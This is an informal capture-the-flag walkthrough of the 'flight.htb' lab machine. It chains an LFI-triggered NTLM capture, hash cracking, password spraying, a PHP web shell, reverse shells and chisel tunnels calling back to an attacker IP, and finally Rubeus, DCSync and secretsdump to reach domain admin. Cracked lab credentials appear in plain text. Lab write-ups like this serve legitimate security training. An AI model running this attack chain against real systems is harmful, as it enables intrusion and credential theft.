Started with a nmap scan
```
53 DNS
80 Apache 2.4.52
88 Kerberos
135
139
389
445
693
636 
3268 Ldap
3269
```
Domain `flight.htb` Hostname `G0` 
The SMB and LDAP both have guest account disabled and cant auth with null session's 
Gonna look at the website now the main site is just a static site none of the links go anywhere doing a subdomain enumeration and we found one subdomain `school.flight.htb` looking around at the site we do have `LFI` at `http://school.flight.htb/index.php?view=C:/Windows/win.ini` we can use this LFI to try and connect to are SMB share with responder and get a hit `http://school.flight.htb/index.php?view=//10.10.16.4/shares` and we got a hit for `svc_apache` now we need to try and crack this hash and it cracked `svc_apache:S@Ss!K@*t13` so we have `READ` access to three shares `Shared,Users,Web` nothing interesting I can tell in there now to get a list of usernames 
```
administrator
Guest
krbtgt
S.Moon
R.Cold
G.Lors
L.Kein
M.Gold
C.Bum
W.Walker
I.Francis
D.Truff
V.Stevens
svc_apache
O.Possum
```
Now time to get bloodhound data `svc_apache` has nothing in the data but if we spray this password aginst all the users we get another account `S.Moon:S@Ss!K@*t13` bloodhound also shows nothing for this user but we do have `WRITE` access to the `Shared` SMB share we cant upload a `exe,xsls` we can upload a `odt` file and it did not get ran I used a program called `ntlm_theft` from github and it generates a bunch of file I put the `desktop.ini` and a `xml` file and ran responder and we got another hash for `c.bum` so now we need to try and crack it and it cracked `c.bum:Tikkycoll_431012284` and this user has access to the `webdev` group and checking out the share we have `write` access to `web` and we can upload a php shell onto the host that we can exacute commands and then use `hoaxshell` to make a powershell payload and now we have a reverse shell as `svc_apache` agin doing some enumeration there is a port running on `8000` so we need to get runasC.exe onto the host and since we have creds to the `c.bum` user we can become him `.\r.exe c.bum Tikkycoll_431012284 -r 10.10.16.4:4444 cmd` now we have a shell as `c.bum` now we need to put chisel onto the host we run `chisel server --reverse 8000` and onto the host `.\chisel.exe client 10.10.16.4:8000 R:8001:localhost:8000` now we can view the website not much with the site but we do have write access to the web root we can put a shell into it and then access it from the site `C:\inetpub\development\` now with this shell we can get another reverse shell as `defualtapppool` now we need to get `rubeus.exe` onto the machine and get a ticket and now we can dcsync now we have ticket and we can run secretsdump and now we have the hashes for the admin account and we can use psexec to auth and now we are the admin account  